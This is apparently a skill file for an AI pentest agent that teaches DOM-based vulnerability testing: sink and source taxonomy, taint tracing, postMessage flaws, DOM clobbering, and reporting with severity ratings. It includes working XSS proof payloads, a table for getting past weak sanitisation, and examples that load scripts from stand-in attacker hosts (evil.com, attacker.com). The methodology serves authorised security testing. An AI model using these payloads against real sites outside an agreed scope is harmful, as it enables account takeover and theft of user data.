---
name: "dom-vulnerabilities"
description: "DOM Vulnerabilities — full sink/source taxonomy, DOM clobbering, taint tracing, postMessage, innerHTML, location.href, jQuery sinks"
version: "1.0.0"
author: "void-extension"
tags: ["pentest", "client", "dom", "dom-xss", "dom-clobbering", "sink", "source", "postmessage", "javascript", "taint-tracing"]
trigger_patterns:
  - "/dom-vulnerabilities"
  - "/dom-vulns"
  - "/dom"
  - "dom vulnerability"
  - "dom xss"
  - "dom clobbering"
  - "dangerous sink"
  - "taint tracing"
  - "postmessage vulnerability"
  - "innerHTML injection"
  - "location.href injection"
---

# DOM Vulnerabilities

DOM-based vulnerabilities are a class of client-side security issues where
attacker-controlled data flows from a **source** (a read point that provides
attacker-influenced data) through application JavaScript into a **sink** (a
function or property whose execution or assignment causes the harmful effect).
Unlike reflected or stored XSS, no server-side component is involved — the
server response is benign, and the browser's own JavaScript creates the
vulnerability.

This skill covers:
1. The full source/sink taxonomy for DOM XSS.
2. DOM clobbering.
3. Systematic taint tracing.
4. postMessage vulnerabilities.
5. Exploitation and reporting methodology.

It does **not** cover: reflected XSS from server-side reflection (use `xss`),
or prototype pollution (use `prototype-pollution`).

## Scope and preconditions

All web applications with JavaScript. Client-side-rendered SPAs (React, Angular,
Vue) and legacy jQuery applications are the highest-risk categories. Requires
access to page JavaScript source via `get_scripts`.

## Rules of engagement

- Test only against accounts and applications in scope.
- Use a unique, trackable payload (e.g., `void_dom_<random>`) to confirm
  execution without triggering production alerts.
- Record each confirmed DOM sink with `add_pentest_finding`.

## Workflow

- [ ] 1. Enumerate sources
- [ ] 2. Enumerate sinks in page JavaScript
- [ ] 3. Trace taint from source to sink
- [ ] 4. Test postMessage vulnerabilities
- [ ] 5. Test DOM clobbering
- [ ] 6. Exploit and confirm
- [ ] 7. Report

## Sink taxonomy

Sinks are JavaScript APIs whose behaviour is attacker-influenced if they receive
tainted data. They are grouped by vulnerability type.

### XSS sinks (HTML/JS execution)

The following properties and functions parse or execute their input when given
attacker-controlled strings:

**HTML parsing sinks** — interpret the string as markup:
- `element.innerHTML` — parses HTML including event handlers; primary DOM XSS vector
- `element.outerHTML` — replaces the element entirely with parsed HTML
- `element.insertAdjacentHTML(position, string)` — inserts parsed HTML at relative position
- `document.write(string)` — writes into the document stream during load
- `document.writeln(string)` — same with a trailing newline
- jQuery `.html(string)`, `.append(string)`, `.prepend(string)`, `.after(string)`, `.before(string)`, `.replaceWith(string)` — all parse HTML when given a string argument rather than a DOM element
- AngularJS `$sce.trustAsHtml(string)` — marks a string as trusted HTML, bypassing Angular sanitisation

**Code execution sinks** — execute the string as JavaScript:
- `window.eval(string)` — executes arbitrary JS string (never pass untrusted input)
- `setTimeout(string, delay)` — string form treated as code; use function form instead
- `setInterval(string, delay)` — same
- `Function(string)` constructor — creates a function from a code string

**Navigation sinks** — cause a navigation if the string is a `javascript:` URI:
- `element.href = string` — unsafe when input is not validated to be http/https
- `element.src = string` — unsafe on script elements
- `location.href = string`
- `location.assign(string)`
- `location.replace(string)`
- `window.open(string)`

### Open redirect sinks

Same navigation sinks as above, but when the attacker-controlled value is an
`http://` or `https://` URL pointing to an external site. Impact is phishing and
OAuth flow hijacking rather than XSS.

### Cookie / storage manipulation sinks

- `document.cookie = string` — plants a cookie in the current origin
- `localStorage.setItem(key, value)` — persists data; read back later by other sinks
- `sessionStorage.setItem(key, value)` — same, session-scoped

### Message passing sinks

- `postMessage(data, '*')` — wildcard target origin leaks data to any listener
- `iframe.contentWindow.postMessage(data, '*')` — same pattern

## Source taxonomy

Sources are read points that supply attacker-controlled data to JavaScript:

### URL-derived sources (most common)

| Source | Example value |
|--------|--------------|
| `location.search` | `?q=<attacker>` |
| `location.hash` | `#<attacker>` |
| `location.href` | Full URL including path |
| `location.pathname` | `/path/<attacker>` |
| `location.hostname` | Host part (less common) |
| `document.URL` | Alias for `location.href` |
| `document.documentURI` | Same |
| `document.baseURI` | Base URL |

### DOM-derived sources

| Source | Notes |
|--------|-------|
| `document.referrer` | Controlled by the linking page |
| `window.name` | Persists across navigation; opener can set it |
| `document.cookie` | If a cookie is attacker-influenced (e.g., via CRLF) |
| `localStorage.getItem(key)` | If key was written from external input |
| `sessionStorage.getItem(key)` | Same |

### postMessage sources

| Source | Notes |
|--------|-------|
| `event.data` in `message` handler | Primary postMessage source |
| `event.origin` (not validated) | Trusted if origin check is missing/weak |

### DOM clobbering sources

| Source | Notes |
|--------|-------|
| Named `<form>`, `<img>`, `<a>` elements | Override `window.x` globals |
| `id` attributes on HTML elements | `window.<id>` = the element |

## Step 1: Enumerate sources

Use `eval_page` to check which URL-derived sources contain attacker-controllable
values on the current page:

```javascript
({
  search: location.search,
  hash: location.hash,
  referrer: document.referrer,
  windowName: window.name
})
```

For hash-based sources: modify the URL hash and re-run.

Check `get_storage` to identify whether localStorage or sessionStorage keys are
populated with values that might originate from URL parameters or external
messages.

## Step 2: Enumerate sinks in page JavaScript

Use `get_scripts` to retrieve all JavaScript files. For each file, use
`search_responses` to scan for dangerous sink patterns:

**HTML parsing sink grep patterns**:
```
innerHTML
outerHTML
insertAdjacentHTML
\.html\(
\.append\(
\.prepend\(
```

**Navigation sink patterns**:
```
location\.href\s*=\s*[^'"]
location\.assign\(
location\.replace\(
window\.open\(
```

**Code execution sink patterns** (dangerous when receiving tainted input):
```
setTimeout\s*\(\s*[^'"]
setInterval\s*\(\s*[^'"]
Function\s*\(
```

## Step 3: Taint tracing

For each sink found, trace backward to find if a source can reach it. This is
the core of DOM XSS analysis.

### Manual taint trace

1. Find the sink: `div.innerHTML = someVariable`
2. Find where `someVariable` is assigned.
3. Trace that assignment — is it from a function argument? Trace the callers.
4. Keep tracing until you reach a source (`location.hash`, `document.referrer`,
   etc.) or a sanitisation function.

### Validation checkpoints

At each step, check for sanitisation:
- `DOMPurify.sanitize(...)` — trusted HTML sanitiser; if used correctly,
  not exploitable.
- Custom regex filters — usually bypassable.
- `encodeURIComponent(...)` — prevents injection into URLs, not HTML.
- `textContent = ...` (instead of `innerHTML`) — safe assignment.

**Common bypass patterns**:

| Sanitisation attempt | Bypass |
|---------------------|--------|
| `input.replace('<script>', '')` | `<script >` or nested variant |
| `input.replace(/script/gi, '')` | `<img onerror=...>` (no script needed) |
| `if (!input.startsWith('http'))` | `HtTp://` or `javascript:` scheme |
| `encodeURIComponent` on fragment | Fragment not sent to server, still DOM-parsed |

### Instrumentation with eval_page

To confirm a taint path, use `eval_page` to intercept innerHTML assignments:

```javascript
const origDesc = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
Object.defineProperty(Element.prototype, 'innerHTML', {
  set(v) {
    console.trace('innerHTML set to:', v.substring(0, 100));
    origDesc.set.call(this, v);
  }
});
```

Then trigger the suspected user flow and check console output.

## Step 4: postMessage vulnerabilities

Use `get_postmessages` to intercept and inspect all `postMessage` calls and
`message` event handlers on the page.

### Vulnerability patterns

**Pattern 1 — No origin validation**:
```javascript
window.addEventListener('message', function(e) {
  div.innerHTML = e.data;  // No origin check — any sender can trigger this
});
```

Attack: from any window (about:blank or another controlled origin), send a
message with an XSS payload. Use `eval_page`:
```javascript
window.postMessage('<img src=x onerror=alert(document.domain)>', '*');
```

**Pattern 2 — Weak origin validation**:
```javascript
if (event.origin.indexOf('example.com') !== -1) { ... }
```

Bypass: `evil-example.com` or `example.com.evil.com` both pass the `indexOf`
check.

**Pattern 3 — Wildcard postMessage sending**:
```javascript
window.postMessage(sensitiveData, '*');
```

Any page that can open or be opened by this window can receive the message and
access the sensitive data.

### Testing postMessage sources

Use `eval_page` to add a passive listener:
```javascript
window.addEventListener('message', (e) => {
  console.log('Message from origin:', e.origin);
  console.log('Data:', JSON.stringify(e.data).substring(0, 200));
}, true);
```

Then use `get_postmessages` to enumerate all message events captured during
browsing. Look for messages that carry sensitive data or trigger DOM mutations.

To send a test message to the page, use `eval_page`:
```javascript
window.postMessage({action: 'loadContent', url: 'javascript:alert(1)'}, '*');
```

## Step 5: DOM clobbering

DOM clobbering allows an attacker to overwrite JavaScript global variables
(properties of `window`) by injecting HTML with specific `name` or `id`
attributes.

### How it works

In browsers, named elements become `window` properties:
```html
<a id="config" href="https://evil.com/poc.js">Click</a>
```

The element is accessible as `window.config`. If application code reads:
```javascript
var url = window.config.href;
location.href = url;
```

Then `window.config.href` is the attacker-controlled `href` attribute value.

### Common clobbering patterns

| HTML injection | Effect |
|---------------|--------|
| `<a id="x">` | `window.x` = HTMLAnchorElement |
| `<form id="x"><input name="y">` | `window.x.y` = HTMLInputElement |
| `<a id="x" name="y">` | `window.x`, `window.y` |
| `<img name="x">` | `window.x` |

### Detection

1. Use `search_responses` to scan JavaScript for global variable reads:
   ```
   window\.\w+
   \bconfig\b
   \bsettings\b
   \bdefaults\b
   ```

2. Identify which of those globals can be influenced by injecting HTML (e.g.,
   via a stored input field, URL fragment, or any innerHTML path).

3. Craft an HTML payload that sets the global to a controlled value and check
   if downstream code uses it in a dangerous sink.

### Example chain

1. HTML injection in a comments field: `<a id="scriptSrc" href="https://evil.com/poc.js">`
2. App JS reads: `script.src = window.scriptSrc.href; document.head.appendChild(script);`
3. Result: attacker controls script source URL — XSS.

## Step 6: Exploit and confirm

Once a source-to-sink path is identified:

1. **Craft the payload** based on the sink type:

   | Sink | Proof payload |
   |------|--------------|
   | `innerHTML` | `<img src=x onerror=alert(document.domain)>` |
   | `location.href` | `javascript:alert(document.domain)` |
   | String-to-code sinks | `alert(document.domain)` |
   | `script.src` | `https://attacker.com/xss.js` |
   | jQuery `.html()` | `<img src=x onerror=alert(1)>` |

2. **Deliver via the source**:
   - URL hash: navigate to `#<img src=x onerror=alert(1)>`
   - URL query: `?q=<payload>`
   - postMessage: use `eval_page` to send the message to the page

3. **Confirm execution** using `eval_page` to check for the side-effect
   (e.g., cookie value changed, global variable set) or visually confirm the
   alert dialog.

4. **Assess the full impact**: can the XSS steal session cookies? Access
   localStorage? Make authenticated API calls? Escalate to account takeover?

5. Use `add_pentest_finding` with:
   - Source (e.g., `location.hash`)
   - Sink (e.g., `innerHTML`)
   - Payload used
   - Impact demonstrated

## Severity reference

| Finding | Severity |
|---------|----------|
| DOM XSS → session cookie theft → ATO | Critical |
| DOM XSS → authenticated API calls as victim | Critical |
| DOM XSS → no sensitive cookies (CSP/HttpOnly mitigates) | High |
| postMessage → DOM XSS from any origin | High |
| DOM clobbering → script execution | High |
| Open redirect via `location.href` | Medium |
| postMessage data leak (no XSS) | Medium |
| DOM clobbering affecting non-security logic | Low |
| Dangerous sink identified but no reachable source | Informational |

## Known false positives

- A dangerous sink called with a hardcoded string literal is not exploitable.
- `DOMPurify.sanitize()` correctly used stops most innerHTML exploits — verify
  it is called on the tainted value and not on a sanitised copy.
- Angular template syntax `{{}}` does not lead to XSS in Angular 2+ (properly
  compiled templates) — only in AngularJS 1.x or when `$sce.trustAsHtml` is used.
- `textContent` and `innerText` assignments are safe; they do not parse HTML.

## Tooling note

This methodology uses Void panel tools: `eval_page` for instrumentation and
payload delivery, `get_scripts` for JavaScript enumeration, `get_postmessages`
for intercepting postMessage events, `search_responses` for sink/source pattern
scanning, `get_storage` for localStorage/sessionStorage inspection, `get_cookies`
for cookie attribute verification, and `add_pentest_finding` to record confirmed
DOM vulnerabilities. These are browser-extension APIs, not shell commands —
do not attempt to run CLI tools.
